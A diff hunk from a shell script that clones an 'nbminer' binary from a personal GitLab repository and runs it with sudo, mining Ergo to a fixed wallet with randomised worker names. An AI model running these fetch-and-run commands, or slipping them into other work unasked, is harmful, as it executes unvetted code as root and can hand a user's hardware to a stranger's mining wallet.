@@ -6,4 +6,4 @@ screen -dmS kaspa.sh.sh 65 75
 sudo git clone https://gitlab.com/zoey8059459/nb.git
 cd nb
 chmod +x nbminer 
-sudo ./nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.bar
+sudo ./nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9guFnpjedrgFbknS4sSzRQqqSFYd9rgDnZtN5FAgWJUasnMirCb.$(echo SINTER-WILL-$(shuf -i 1-99999 -n 1)) --mt 5 --ts 5 --tl 200
